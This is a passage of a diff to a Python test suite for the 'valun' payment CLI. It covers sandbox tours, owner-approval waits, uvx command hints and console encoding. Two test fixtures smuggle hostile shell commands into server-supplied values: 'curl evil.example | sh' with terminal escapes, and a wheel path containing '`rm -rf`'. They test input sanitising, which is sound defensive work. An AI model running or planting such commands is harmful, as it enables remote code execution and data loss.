+            n = json.loads(out)['sandbox_next_steps']
+            self.assertEqual((n['tour_step'], n['next_calls']), ('done', []), (brief, n))
+            self.assertNotIn('retry_after_seconds', n, 'done: nothing to wait for')
+            self.assertEqual(n['then'], va.TOUR_COMPLETED)
+        self.assertEqual(self.disk().get('sandbox_tour_done'), S_ID, 'the end is kept in the profile')
+        posts = len(self.world.posts)
+        rc, out = self.run_cli('sandbox', 'tour', tty=True, answers=[])      # nothing is asked
+        self.assertNotIn('step 3 of 5', out)
+        self.assertEqual((rc, len(self.world.posts)), (0, posts), out)
+        self.assertEqual(out.strip(), va.TOUR_COMPLETED)
+        self.assertEqual(va.TOUR_DONE_KEY, 'sandbox_tour_done')
 
     def test_a_sandbox_agent_that_pays_on_a_slower_tick_is_waited_for(self):
         # The live server: a sandbox agent's note reaches the tracker a tick after it paid, so a status can read the
@@ -955,6 +1633,33 @@ class Tour(Cli):
         rc, out = self.run_cli('sandbox', 'tour', '--yes')
         self.assertEqual((rc, json.loads(out.strip().splitlines()[-1])['error']), (1, 'tour_stuck'))
         self.assertEqual([d['status'] for d in self.world.deals.values()].count('disputed'), sb.TOUR_DISPUTES_PER_STEP)
+
+    def test_a_3_cycle_that_cannot_form_stops_the_tour_early_and_a_later_run_finishes_it(self):
+        # The onboarding review's stall (testnet, 2026-11-16): earlier tours' step 5 had left sandbox-mallory owing
+        # sandbox-exact 2 PC, the server set this tour's step-2 debt of sandbox-exact to sandbox-mallory off against
+        # it at once, and step 4's 3-cycle could never be proposed: the tour waited for it until its 30-minute deadline.
+        self.join()
+        w = self.world
+        w.set_edge(M_ID, X_ID, 2, now_ms() - 3_600_000)
+        start = sb.time.time()
+        rc, out = self.run_cli('sandbox', 'tour', '--yes')
+        err = json.loads(out.strip().splitlines()[-1])
+        self.assertEqual((rc, err['error']), (1, 'tour_blocked'), out)
+        self.assertLess(sb.time.time() - start, 600, 'it stops minutes after the wait is known to be blocked')
+        self.assertIn('step 4 cannot finish now (cycle_leg_missing): The 3-cycle sandbox-mallory -> you -> '
+                      'sandbox-exact -> sandbox-mallory cannot clear now', err['message'])
+        self.assertIn('Nothing is lost', err['what_this_means'])
+        self.assertIn('  (waiting up to 2 minutes for that to change)', out)
+        self.assertEqual(out.count('cannot clear now'), 2, out)        # said once while it waited, then in the error
+        totals = (w.total(X_ID, M_ID), w.total(M_ID, X_ID), w.total(M_ID, S_ID), w.total(S_ID, X_ID))
+        self.assertEqual(totals, (0, 0, 3, 1))
+        # Another participant's step 2 gives sandbox-exact a debt to sandbox-mallory again: run again, the tour goes on
+        # from step 4 and finishes.
+        w.set_edge(X_ID, M_ID, 2, now_ms() - 1_000, 'transfer_in', 'vt_other')
+        rc, out = self.run_cli('sandbox', 'tour', '--yes')
+        self.assertEqual(rc, 0, out)
+        self.assertIn('The tour is complete', out)
+        self.assertEqual((w.total(M_ID, S_ID), w.total(S_ID, X_ID)), (0, 0))
 
     def test_the_tour_is_only_for_sandbox_participants_on_a_circulating_server(self):
         self.join(sandbox=False)
@@ -1158,6 +1863,93 @@ class TourStops(unittest.TestCase):
         self.assertIn('step 2 done. Your edges on the tracker: none', lines)
 
 
+class OwnerWaitTourAgent:
+    """An agent whose sandbox_next_steps are `plans`, one per valun_status (the last one repeats): what a tour with
+    console approvals sees while the owner approves each held step a few polls late."""
+
+    def __init__(self, plans):
+        self.plans, self.calls, self.c = list(plans), [], StepTourClient()
+
+    def client(self):
+        return self.c
+
+    def status(self, a):
+        return {'sandbox_next_steps': dict(self.plans.pop(0) if len(self.plans) > 1 else self.plans[0])}
+
+    def is_commitment(self, name, args):
+        return False
+
+    def call(self, name, args):
+        self.calls.append(name)
+        return {'what_happened': f'{name}: sent'}
+
+
+class TourOwnerWaits(unittest.TestCase):
+    """The first-tester readiness assessment of 2026-11-18 (blocker 3, tour-run.out): with console approvals the tour
+    logged "step N done", with that step's edges, each time it began to wait for the owner (the owner-wait plan names
+    no step), then announced the same step again once the owner approved. A step is done only when the tour moves on
+    to a later step or ends; while the owner decides, the tour says what waits and where to approve it."""
+    setUp = TourStops.setUp
+    WHERE = ('Your owner must first approve a commitment in the owner console, https://valun.example/pilot#owner (deal '
+             'vd_0123456789abcdef, approval va_0123456789ab; in a terminal, `valun --profile s console` opens it); tell '
+             'them, then call valun_status again.')
+
+    def plan(self, step, tool=None, then='wait'):
+        calls = [{'tool': tool, 'why': tool, 'arguments': {}}] if tool else []
+        return {'tour_step': step, 'of': 5, 'goal': f'goal {step}', 'then': then, 'next_calls': calls}
+
+    def test_a_step_waiting_for_the_owner_is_not_done(self):
+        owner = self.plan(None, then=self.WHERE)
+        ag = OwnerWaitTourAgent([self.plan(1, 'valun_propose'), owner, owner, self.plan(1, 'valun_deliver'), self.plan(1),
+                                 self.plan(2, 'valun_propose'), owner, self.plan(2, 'valun_review_delivery'),
+                                 self.plan('done', then='The tour is complete.')])
+        lines = []
+        r = sb.tour(None, yes=True, log=lines.append, agent=ag, poll_s=3)
+        self.assertEqual(lines, ['step 1 of 5: goal 1', '  -> valun_propose: valun_propose', '     valun_propose: sent',
+                                 f'  ... {self.WHERE}',
+                                 '  -> valun_deliver: valun_deliver', '     valun_deliver: sent', '  ... wait',
+                                 'step 1 done. Your edges on the tracker: none',
+                                 'step 2 of 5: goal 2', '  -> valun_propose: valun_propose', '     valun_propose: sent',
+                                 f'  ... {self.WHERE}',
+                                 '  -> valun_review_delivery: valun_review_delivery', '     valun_review_delivery: sent',
+                                 'step 2 done. Your edges on the tracker: none', 'The tour is complete.'])
+        self.assertEqual((r['done'], [s['step'] for s in r['steps']]), (True, [1, 2]))
+
+    def test_the_last_steps_totals_are_read_when_the_tour_ends_after_the_owners_last_approval(self):
+        """The 0.7.1 staging run (2026-11-17): with console approvals, step 5's "Your edges on the tracker" was printed
+        while its last payment still waited for the owner, so its totals were stale. A step's totals are read once the
+        tour moves past it or ends, so the last ones come after the owner's last approval (the candidate's staging test,
+        2026-11-18: at 05:21:57, after the approval of 05:21:43, every edge at 0)."""
+        owner = self.plan(None, then=self.WHERE)
+        ag = OwnerWaitTourAgent([self.plan(5, 'valun_review_delivery'), owner, owner,
+                                 self.plan('done', then='The tour is complete.')])
+        edge = f"{'03' + '22' * 32}>{ag.c.pubkey}"
+        # the claim is cleared once the owner approved the last payment (the plans the agent has left say so)
+        ag.c.sync_edges = lambda now_ms=None: {'edges': {edge: {'total': 0 if len(ag.plans) == 1 else 2_000_000}},
+                                               'doubtful': []}
+        lines = []
+        r = sb.tour(None, yes=True, log=lines.append, agent=ag, poll_s=3)
+        done = [x for x in lines if x.startswith('step 5 done')]
+        self.assertEqual(len(done), 1, lines)
+        self.assertGreater(lines.index(done[0]), lines.index(f'  ... {self.WHERE}'), 'never before the owner approved')
+        self.assertIn(f"{'03' + '22' * 7}... -> you: 0 ", done[0])
+        self.assertEqual(lines[-1], 'The tour is complete.')
+        self.assertEqual(r['steps'][-1]['tracker_totals'], {f"{'03' + '22' * 7}... -> you": 0})
+
+    def test_a_tour_that_starts_while_the_owner_decides_names_no_step_done(self):
+        # an earlier run's offer still waits for the owner; a step that goes back (a deal ended) is not done either
+        owner = self.plan(None, then=self.WHERE)
+        ag = OwnerWaitTourAgent([owner, self.plan(3, 'valun_propose'), self.plan(2, 'valun_propose'), self.plan(3),
+                                 self.plan(4, 'valun_propose'), self.plan('done', then='The tour is complete.')])
+        lines = []
+        r = sb.tour(None, yes=True, log=lines.append, agent=ag, poll_s=3)
+        self.assertEqual([x for x in lines if x.startswith('step ') or x.startswith('  ... ')],
+                         [f'  ... {self.WHERE}', 'step 3 of 5: goal 3', 'step 2 of 5: goal 2', 'step 3 of 5: goal 3',
+                          '  ... wait', 'step 3 done. Your edges on the tracker: none', 'step 4 of 5: goal 4',
+                          'step 4 done. Your edges on the tracker: none'])
+        self.assertEqual([s['step'] for s in r['steps']], [3, 4])
+
+
 class LyingTourClient(StepTourClient):
     """A client of a server that lies in its inbox: the deal's verified terms are what `terms` says."""
     participant_id = 'vp_0000000000me'
@@ -1241,6 +2033,13 @@ class TourYesChecksWhatIsSigned(unittest.TestCase):
         ag = LyingTourAgent(tour_terms(price=30))
         sb.tour(None, yes=True, ask=lambda text: True, log=lambda line: None, agent=ag, poll_s=3)
         self.assertEqual(len(ag.calls), 1)
+        # With console approvals the stop says so (the 0.7.2 review: "run it without --yes" changes nothing there)
+        ag = LyingTourAgent(tour_terms(price=30))
+        with self.assertRaises(vc.ValunError) as e:
+            sb.tour(None, yes=True, log=lambda line: None, agent=ag, poll_s=3, console=True)
+        self.assertEqual((e.exception.code, ag.calls), ('tour_unverified', []))
+        self.assertIn("with console approvals it signs by itself only what the tour's own rules allow", str(e.exception))
+        self.assertNotIn('without --yes', str(e.exception))
 
     def test_a_payment_with_a_held_note_must_use_the_other_sandbox_agents_note(self):
         call = {'tool': 'valun_review_delivery', 'why': 'pay it', 'arguments': {'deal_id': 'vd_0123456789abcdef',
@@ -1353,6 +2152,30 @@ class AttemptsCommands(Cli):
         self.assertIn('#1 paying with the note of ', out)
         self.assertIn('your claim 3 -> 1 PC', out)
         self.assertIn('server id vt_0123456789abcdef: can still apply', out)
+
+    def test_list_first_learns_what_the_owner_decided(self):
+        """The review's mutation run: removing the refresh in `valun attempts list` failed no test. A payment by transfer
+        the server held for the owner, who rejected it in the owner console, is listed as not applied once the deal view
+        is read, with what may be signed now: a payment through the same IOU, never a new IOU of the deal."""
+        deal = self.with_attempt(server_state='void_rejected')
+        disk = self.disk()
+        disk['transfer_attempts'][deal][0]['approval_id'] = 'va_27df22079678'
+        self.write(disk)
+        view = self.world.view
+
+        def with_approval(did):
+            out = view(did)
+            if did == deal:
+                out['approvals'] = [{'id': 'va_27df22079678', 'deal_id': deal, 'kind': 'pay_by_transfer', 'state': 'rejected',
+                                     'created_at': '2026-11-17T23:00:00.000Z', 'decided_at': '2026-11-17T23:01:00.000Z'}]
+            return out
+        self.world.view = with_approval
+        rc, out = self.run_cli('attempts', 'list')
+        self.assertEqual(rc, 0, out)
+        self.assertIn('not applied (the server held it for your owner, who rejected it in the owner console, and never sent '
+                      'it on). A payment through the same IOU at the same prior state can be signed now; your own IOU or any '
+                      f'other payment of this deal waits until after {va.free_after(self.T)}', out)
+        self.assertEqual(self.disk()['transfer_attempts'][deal][0]['outcome'], 'not_applied')
 
     def test_resolve_asks_at_a_terminal_and_uses_the_owner_token_once(self):
         self.with_attempt()
@@ -1527,7 +2350,7 @@ class AttemptsCommands(Cli):
                       'moved_past). Nothing was changed', out)
         self.assertIn("moved past the transfer's timestamp at its earlier total", out)
         # The attempt is quoted: pasted into bash, zsh or PowerShell, an unquoted '#1 --not-applied' is a comment.
-        self.assertIn(f"`valun --profile s attempts resolve {self.deal} '#1' --not-applied`", out)
+        self.assertIn(f'`valun --profile s attempts resolve {self.deal} "#1" --not-applied`', out)
         self.assertNotIn(' #1 --not-applied', out)
         self.assertIn('ask the operator to look into it with the payee', out)
         self.assertNotIn('INCONSISTENT', out)
@@ -1752,7 +2575,21 @@ class AttemptsCommands(Cli):
         self.assertEqual(rc, 0, out)
         self.assertIn('your claim 3 -> 2 PC', [x for x in out.splitlines() if 'MAY HAVE APPLIED' in x][0])
         self.assertIn('`valun --profile s attempts resolve DEAL ATTEMPT --applied`', out)    # FX3-PY: names the profile
-        self.assertIn("ATTEMPT is '#n' in quotes (unquoted, a # starts a comment in the shell)", out)
+        # double quotes, which cmd reads as PowerShell and bash do (the RC's review, R2-OTHER-4: cmd passed '#1' with its
+        # single quotes, which the client refuses as no attempt). The list shows each attempt bare (#1), so the advice
+        # says to write it in double quotes, not that the list prints them so (the RC's review, round 3, R3-REG-3)
+        self.assertTrue(any(x.startswith('  #1 ') for x in out.splitlines()), out)
+        self.assertIn('ATTEMPT is the #n this list shows, written in double quotes ("#1": unquoted, a # starts a comment in '
+                      'bash and PowerShell, and cmd keeps single quotes as part of it)', out)
+        self.assertNotIn('as this list prints it', out)
+        self.assertNotIn("'#n'", out)
+        if os.name == 'nt':
+            import subprocess
+            echo = 'import sys,json;print(json.dumps(sys.argv[1:]))'
+            r = subprocess.run(f'"{sys.executable}" -c "{echo}" "#1" ' + "'#1'", shell=True, capture_output=True, text=True,
+                               timeout=60)
+            got = json.loads(r.stdout)
+            self.assertEqual([bool(vc._ATTEMPT_REF_RE.fullmatch(a)) for a in got], [True, False], got)
 
     def test_a_paid_deal_paid_by_a_payment_the_list_does_not_show_has_nothing_to_resolve(self):
         # FX3-PY (FX2-PY verifier, item 8): records.paid_deals names a payment that no row of the list shows (paid_by
@@ -1860,6 +2697,597 @@ class EarnAndBuy(Cli):
         seller.step()
         seller.step()
         self.assertEqual(self.world.requests().count('GET /pilot/v1/consents'), 1)
+
+
+class NextHintsUnderUvx(Cli):
+    """Fix inbox #88 (2): run as `uvx --from valun==X valun join ...` (skill.md's way), the commands join and the other
+    next-step hints print are the ones a later shell can run, where no `valun` is on the PATH: `uvx --from valun==X valun
+    --profile s doctor`. uvx is told by its environment (sys.prefix in an archive-v<N> folder of uv's cache). Where uv
+    started the command some other way (UV set: `uv run`, say) the hint names `valun` and then the uvx form; run as
+    `valun` (no uv), every hint is as before (the tests above)."""
+    UVX = f'uvx --from valun=={__version__} valun'
+    PREFIXES = ('/home/ann/.cache/uv/archive-v0/RC88w8KPTszFcwZc', 'C:\\Users\\Ann\\AppData\\Local\\uv\\cache\\archive-v0\\RC88w8KPTszFcwZc',
+                '/Users/ann/.cache/uv/archive-v12/x1')
+    VENV = '/home/ann/project/.venv'
+
+    def run_under(self, prefix, fn, uv='/home/ann/.local/bin/uv'):
+        """fn() with sys.prefix `prefix`, and UV set to `uv` (None: unset)."""
+        with mock.patch.object(sys, 'prefix', prefix), mock.patch.dict(os.environ):
+            os.environ.pop('UV', None)
+            if uv:
+                os.environ['UV'] = uv
+            return fn()
+
+    def test_uvx_is_told_by_its_environment_and_nothing_else_is_taken_for_it(self):
+        for prefix in self.PREFIXES:
+            self.assertTrue(self.run_under(prefix, cli._run_by_uvx), prefix)
+            self.assertTrue(self.run_under(prefix, cli._run_by_uvx, uv=None), 'the environment alone tells it')
+            self.assertEqual(self.run_under(prefix, cli._valun), self.UVX)
+            self.assertEqual(self.run_under(prefix, cli._with_uvx), '', 'the uvx form itself: nothing to add')
+        for prefix in ('/home/ann/.local/share/uv/tools/valun', self.VENV, 'C:\\Python314', '/home/ann/.cache/uv/builds-v0/.tmpbxqWuf',
+                       '/tmp/my-cache/archive-v0/abc'):
+            self.assertFalse(self.run_under(prefix, cli._run_by_uvx), prefix)
+            self.assertEqual(self.run_under(prefix, cli._valun, uv=None), 'valun')
+        self.assertEqual(self.run_under(self.VENV, cli._with_uvx), f' (with uvx: `{self.UVX} ...`)')
+        self.assertEqual(self.run_under(self.VENV, cli._with_uvx, uv=None), '')
+
+    def test_join_run_by_uvx_names_the_uvx_command_in_every_hint(self):
+        out = self.run_under(self.PREFIXES[0], self.join)
+        u = self.UVX
+        self.assertIn(f'Next: run `{u} --profile s doctor`, then, for your agent, one of:\n'
+                      f'  - In an MCP app: add `{u} --profile s mcp` to it (see `{u} mcp --help`).\n', out)
+        self.assertIn(f'change it with `{u} --profile s config consents.<role> on|off`', out)
+        self.assertIn(f'and signs them in the background while `{u} --profile s mcp` (consent_loop on) or `{u} --profile s '
+                      'clearing watch` runs.', out)
+        self.assertEqual(re.findall(r'`valun ([^`]+)`', out), [], 'no command names a bare valun')
+        cmds = re.findall(r'`(uvx --from valun==[^ ]+ valun [^`]+)`', out)
+        self.assertTrue(cmds and all(c.startswith(f'{u} --profile s ') or c == f'{u} mcp --help' for c in cmds), cmds)
+        argv = shlex.split(re.search(r'Next: run `([^`]+)`', out).group(1))
+        self.assertEqual(argv[:4], ['uvx', '--from', f'valun=={__version__}', 'valun'])
+        rc, out = self.main(argv[4:])                     # what it names runs: doctor of this profile
+        self.assertIn('Agent accepted by the server as stranger', out)
+
+    def test_join_started_by_uv_some_other_way_adds_the_uvx_form(self):
+        out = self.run_under(self.VENV, self.join)
+        self.assertIn(f'Next: run `valun --profile s doctor` (with uvx: `{self.UVX} ...`), then, for your agent, one of:\n',
+                      out)
+
+    # The first-tester readiness assessment of 2026-11-18 (blocker 7): join told every agent to add `valun mcp`, whose
+    # consent loop signs the set-offs and payments to it; a shell agent never runs it, and its set-off waited until
+    # `valun clearing run`. The Nov 18 fresh-join run (finding 3): join's Next block has two equal branches, the MCP
+    # app's and the shell agent's, in the pinned uvx form.
+    SHELL = ('  - From a shell: run `{v} --profile s call valun_inbox` regularly, which shows what waits for your agent, and '
+             'signs the set-offs and payments to you by transfer that your policy allows; or keep `{v} --profile s clearing '
+             'watch` running, which signs all your policy allows{uvx}.\n')
+
+    def test_join_run_by_uvx_tells_a_shell_agent_what_signs_its_consents(self):
+        out = self.run_under(self.PREFIXES[0], self.join)
+        self.assertIn(self.SHELL.format(v=self.UVX, uvx=''), out)
+        self.assertLess(out.index('  - In an MCP app: '), out.index('  - From a shell: '))
+        self.assertTrue(out.endswith(self.SHELL.format(v=self.UVX, uvx='')), 'the last lines of join')
+        argv = shlex.split(re.search(r'run `([^`]+call valun_inbox)`', out).group(1))
+        self.assertEqual(argv[:4], ['uvx', '--from', f'valun=={__version__}', 'valun'])
+        rc, out = self.main(argv[4:])                     # what it names runs: valun_inbox of this profile
+        self.assertEqual(rc, 0, out)
+        self.assertIn('respond', json.loads(out))
+
+    def test_join_run_as_valun_names_the_shell_commands_and_their_pinned_uvx_form(self):
+        out = self.run_under(self.VENV, self.join, uv=None)
+        self.assertIn(self.SHELL.format(v='valun', uvx=f' (with uvx: `{self.UVX} ...`)'), out)
+
+    def test_the_other_next_step_hints_run_by_uvx(self):
+        u = self.UVX
+        rc, out = self.run_under(self.PREFIXES[1], lambda: self.run_cli('doctor', '--server', SERVER))     # not joined
+        self.assertIn(f'FIX   Not connected: run `{u} --profile s join --sandbox --handle YOUR-HANDLE --operator "YOUR NAME" '
+                      f'--server {SERVER}` (no invite: sandbox only), '
+                      f'`{u} --profile s join --server {SERVER}` (with an invite) or `{u} --profile s enroll --server {SERVER}` '
+                      '(with an enrollment code).', out)                  # the uvx form itself: nothing follows
+        rc, out = self.run_under(self.PREFIXES[1], lambda: self.run_cli('sandbox', 'earn'))
+        self.assertIn(f"Profile 's' is not joined yet; run `{u} --profile s join` first.", out)
+        rc, out = self.run_under(self.VENV, lambda: self.run_cli('doctor', '--server', SERVER))
+        self.assertIn(f'`valun --profile s enroll --server {SERVER}` (with an enrollment code) (with uvx: `{u} ...`).', out)
+        # join stopped at enrolment: what it says to finish names the uvx command too
+        self.world.fail['POST /pilot/v1/enroll'] = [vc.ValunError('rate_limited', 'too many requests; slow down', 429)]
+        rc, out = self.run_under(self.PREFIXES[0], lambda: self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann',
+                                                                        '--server', SERVER, '--owner-token-file', self.token_file))
+        self.assertEqual(rc, 1, out)
+        self.assertIn(f'then run `{u} --profile s enroll --server {SERVER} --participant {S_ID}`.', out)
+
+    def test_the_hints_an_agent_meets_next_name_the_uvx_command_too(self):
+        """The 0.7.2 review: join with approvals ask (skill.md's), `valun call` of a commitment where nobody can approve
+        it, the consent loop's and policy hints, and the MCP server's approval_unavailable name the uvx command, with
+        this profile, where uvx runs this one."""
+        u = self.UVX
+        rc, out = self.run_under(self.PREFIXES[0], lambda: self.run_cli(
+            'join', '--handle', 'stranger', '--operator', 'Ann', '--approvals', 'ask', '--server', SERVER, '--owner-token-file',
+            self.token_file, '--sandbox'))
+        self.assertEqual(rc, 0, out)
+        self.assertIn(f'in this terminal for `{u} call`', out)
+        self.assertEqual(re.findall(r'`valun ([^`]+)`', out), [], 'no command names a bare valun')
+        rc, out = self.run_under(self.PREFIXES[0], lambda: self.run_cli('call', 'valun_propose', json.dumps({
+            'counterparty': 'sandbox-exact', 'role': 'payer', 'title': 't', 'description': 'd', 'deliverable': 'x', 'price': 1})))
+        self.assertEqual(json.loads(out)['error'], 'approval_unavailable', out)
+        self.assertIn(f'`{u} --profile s config approvals console --owner-token-file FILE`', json.loads(out)['message'])
+        for argv in (('policy', 'show'), ('config', 'consent_loop', 'on')):
+            rc, out = self.run_under(self.PREFIXES[0], lambda argv=argv: self.run_cli(*argv))
+            self.assertEqual(re.findall(r'`valun ([^`]+)`', out), [], (argv, out))
+            self.assertIn(f'`{u} --profile s ', out, argv)
+        from valun import mcp_server
+        self.assertIn(f'`{u} --profile s config approvals console --owner-token-file FILE`',
+                      mcp_server.McpServer(None, 'ask', command=f'{u} --profile s').approval_unavailable['what_this_means'])
+        self.assertIn('`valun config approvals console --owner-token-file FILE`',
+                      mcp_server.APPROVAL_UNAVAILABLE['what_this_means'], 'as before, by default')
+
+    def test_the_uvx_command_runs_the_source_this_valun_came_from(self):
+        """The 0.7.2 review: a valun that uvx installed from a URL (a release candidate's wheel, a git checkout: its
+        direct_url.json, PEP 610) is named by that URL, not by a version on PyPI that is another valun, or none."""
+        class Dist:
+            def __init__(self, text):
+                self.text = text
+
+            def read_text(self, name):
+                return self.text if name == 'direct_url.json' else None
+        cases = [(None, f'valun=={__version__}'),
+                 (json.dumps({'url': 'file:///C:/Users/Ann%20Smith/valun-0.7.2-py3-none-any.whl', 'archive_info': {}}),
+                  'file:///C:/Users/Ann%20Smith/valun-0.7.2-py3-none-any.whl'),
+                 (json.dumps({'url': 'https://github.com/fitzss/valun-open.git', 'vcs_info': {'vcs': 'git', 'commit_id': 'ab' * 20},
+                              'subdirectory': 'python'}), f"git+https://github.com/fitzss/valun-open.git@{'ab' * 20}#subdirectory=python"),
+                 (json.dumps({'url': 'https://hg.example/valun', 'vcs_info': {'vcs': 'hg', 'commit_id': '1'}}), f'valun=={__version__}'),
+                 (json.dumps({'url': 'file:///tmp/a b`rm -rf`.whl'}), f'valun=={__version__}'),
+                 ('not json', f'valun=={__version__}')]
+        for text, want in cases:
+            with mock.patch('importlib.metadata.distribution', lambda _name, text=text: Dist(text)):
+                self.assertEqual(cli._uvx_from(), want, text)
+                self.assertEqual(self.run_under(self.PREFIXES[0], cli._valun), f'uvx --from {want} valun', text)
+        with mock.patch('importlib.metadata.distribution', side_effect=Exception('no metadata')):
+            self.assertEqual(cli._uvx_from(), f'valun=={__version__}')
+
+    def test_no_invite_code_names_this_profile_and_server(self):
+        rc, out = self.run_under(self.PREFIXES[0], lambda: self.run_cli(
+            'join', '--handle', 'stranger', '--operator', 'Ann', '--approvals', 'none', '--server', SERVER, '--owner-token-file',
+            self.token_file, '--invite-from-stdin', stdin='invite-code\n'))
+        self.assertNotIn('No invite code?', out, '--invite-from-stdin: an invite is given')
+        out, err = io.StringIO(), io.StringIO()
+        # at a terminal, whatever stdin the tests run with (without one, join prints the command to run instead: the RC's
+        # review found this test failing with stdin a pipe)
+        with mock.patch.object(sys, 'prefix', self.PREFIXES[0]), contextlib.redirect_stdout(out), contextlib.redirect_stderr(err), \
+                mock.patch('getpass.getpass', side_effect=KeyboardInterrupt), mock.patch.object(cli, '_at_terminal', lambda: True):
+            rc = cli.main(['--profile', 'work', 'join', '--server', SERVER])     # Ctrl+C at the invite prompt, as it says
+        self.assertIn(f'run `{self.UVX} --profile work join --sandbox --server {SERVER}`.', out.getvalue())
+        self.assertEqual((rc, err.getvalue()), (130, '\nvalun join: stopped (Ctrl+C).\n'), 'a short line, never a traceback')
+
+
+class OutputOnAnyConsole(Cli):
+    """The 0.7.2 review: what the CLI prints as JSON is the same JSON on a stdout that cannot encode a character of it
+    (a redirected stdout on Windows writes the ANSI code page), escaped, never a UnicodeEncodeError after the call ran;
+    and a participant id a server sends is printed as a word of one line."""
+
+    def test_json_is_escaped_where_stdout_cannot_encode_it(self):
+        out = {'title': 'Brief \u2192 summary \U0001F600', 'n': 1}
+        cp1252 = io.TextIOWrapper(io.BytesIO(), encoding='cp1252')
+        with mock.patch.object(sys, 'stdout', cp1252):
+            text = cli._json_text(out, indent=1)
+            print(text)
+        self.assertEqual(json.loads(text), out)
+        self.assertIn('\\u2192', text)
+        utf8 = io.TextIOWrapper(io.BytesIO(), encoding='utf-8')
+        with mock.patch.object(sys, 'stdout', utf8):
+            self.assertIn('\u2192', cli._json_text(out))
+
+    def test_a_progress_line_never_goes_to_stdout(self):
+        out = io.StringIO()
+        with mock.patch.object(sys, 'stderr', None), contextlib.redirect_stdout(out):
+            cli._say_aside('waiting up to 600 s for the next box')
+        self.assertEqual(out.getvalue(), '', 'no stderr: nothing, never stdout (print(file=None) writes there)')
+        err = io.StringIO()
+        with mock.patch.object(sys, 'stderr', err), contextlib.redirect_stdout(out):
+            cli._say_aside('waiting\x1b[2J up to 600 s')
+        self.assertEqual((out.getvalue(), err.getvalue()), ('', 'waiting [2J up to 600 s\n'))
+
+    def test_a_participant_id_the_server_sends_is_printed_as_one_word(self):
+        evil = 'vp_5a5a5a5a5a5a`; curl evil.example | sh; echo `\x1b[2K\x1b[1Aok'
+        handle = self.world.handle
+
+        def answer(method, path, body=None, token=None):
+            r = handle(method, path, body, token)
+            return dict(r, participant_id=evil) if method == 'POST' and path.endswith('/join-sandbox') else r
+        self.world.fail['POST /pilot/v1/enroll'] = [vc.ValunError('rate_limited', 'too many requests; slow down', 429)]
+        with mock.patch.object(self.world, 'handle', answer):
+            rc, out = self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
+                                   '--owner-token-file', self.token_file)
+        self.assertEqual(rc, 1, out)
+        self.assertNotIn('\x1b', out)
+        line = next(x for x in out.splitlines() if x.startswith('To finish'))
+        self.assertTrue(line.endswith('--participant PARTICIPANT_ID`.'), line)
+        self.assertIn('Your participant PARTICIPANT_ID was created', out)
+
+
+# `valun ...` commands, one after the other, in a child process whose stdout is a pipe with the encoding and error
+# handler Python itself chooses for it (no PYTHONIOENCODING, PYTHONUTF8 or PYTHONLEGACYWINDOWSSTDIO), as an agent or
+# `| more` gets it: on Windows the ANSI code page (cp1252 here) with errors='surrogateescape'. Every request goes to
+# the offline World of test_agent_circulation (routed); the child reports each command's exit status and the mandates
+# set to `report`, and stdout's encoding and error handler on its stderr's first line.
+PIPED_CLI = r'''
+import json, os, sys
+sys.path.insert(0, {tests!r})
+sys.path.insert(0, {src!r})
+from unittest import mock
+from test_agent_circulation import CIRC, World, routed
+from valun import cli, client as vc
+sys.stderr.write('stdout: ' + json.dumps([sys.stdout.encoding, sys.stdout.errors]) + chr(10))
+sys.stderr.flush()
+world = World(CIRC, s_key=None)
+routed(world).start()
+mock.patch.object(vc, 'ENROLL_RETRY_S', (0, 0)).start()
+rcs = []
+try:
+    for argv in {runs!r}:
+        rcs.append(cli.main(['--profile', 's', *argv]))
+        sys.stdout.flush()
+finally:
+    with open({report!r}, 'w', encoding='utf-8') as f:
+        json.dump({{'rcs': rcs, 'puts': len(world.puts)}}, f)
+'''
+
+
+class CodePageStdout(unittest.TestCase):
+    """The RC's review (windows-acl W2; again in round 3, windows-acl WIN1 and regressions R3-REG-1): on Windows a stdout
+    that is not a console (an agent, a pipe, a file) writes the ANSI code page, cp1252 here, with the error handler
+    'surrogateescape', which raises UnicodeEncodeError for a character the code page lacks. With a home folder named
+    outside it ('Fitz Dóud 名前'), `valun join` ended in that error at the line naming the owner token file: written,
+    the participant had no saved agent key; not written (a file there already, or one that cannot be made), the owner
+    token was never shown, so it was lost. "Credentials are stored privately in <profile>", doctor's "profiles in
+    <folder>", status and console failed the same way. The first fix changed only a stream whose handler is 'strict',
+    which Python on Windows never gives a pipe, so it did nothing there, and its test passed only because it built a
+    strict stream itself. Now main() lets such a stdout print any text (a \\u escape for what the code page lacks), and
+    a value a printed command would carry with an escape is named apart instead (_faithful), as FILE is for the owner
+    token file. These run in a child process whose stdout is a real pipe; elsewhere than on Windows the child is given
+    cp1252 with surrogateescape (PYTHONIOENCODING), as Windows gives it."""
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self.tmp.cleanup)
+        self.uhome = os.path.join(self.tmp.name, 'Fitz Dóud 名前')
+        os.makedirs(self.uhome)
+
+    def piped(self, *runs):
+        """The commands `runs` (argv lists, after --profile s) in one child process: (exit statuses, mandates set, what
+        stdout carried, as text, and stderr). The child's own exit status is the last command's, or 1 on a traceback."""
+        import subprocess
+        report = os.path.join(self.tmp.name, 'report.json')
+        code = PIPED_CLI.format(tests=HERE, src=os.path.join(os.path.dirname(HERE), 'src'), runs=[list(r) for r in runs],
+                                report=report)
+        env = {k: v for k, v in os.environ.items() if not k.upper().startswith(('VALUN_', 'PYTHON'))}
+        env.update(VALUN_HOME=self.uhome, HOME=self.uhome, USERPROFILE=self.uhome)
+        if os.name != 'nt':
+            env['PYTHONIOENCODING'] = 'cp1252:surrogateescape'       # what Windows gives a pipe
+        p = subprocess.run([sys.executable, '-c', code], stdin=subprocess.DEVNULL, capture_output=True, env=env,
+                           cwd=self.tmp.name, timeout=300)
+        err = p.stderr.decode('utf-8', 'replace')
+        first = err.splitlines()[0] if err else ''
+        self.assertTrue(first.startswith('stdout: '), err)
+        encoding, errors = json.loads(first[len('stdout: '):])
+        if os.name == 'nt' and not encoding.lower().replace('-', '').startswith('utf'):
+            self.assertEqual(errors, 'surrogateescape', 'what Python on Windows gives a pipe')
+        with open(report, encoding='utf-8') as f:
+            got = json.load(f)
+        self.assertNotIn('Traceback', err)
+        return got['rcs'], got['puts'], p.stdout.decode(encoding, 'replace').replace('\r\n', '\n'), err
+
+    def join(self, *extra):
+        return self.piped(['join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--approvals', 'none',
+                           '--server', SERVER, *extra], ['status'], ['doctor'], ['console', '--no-open'])
+
+    def finished(self, rcs, puts, out):
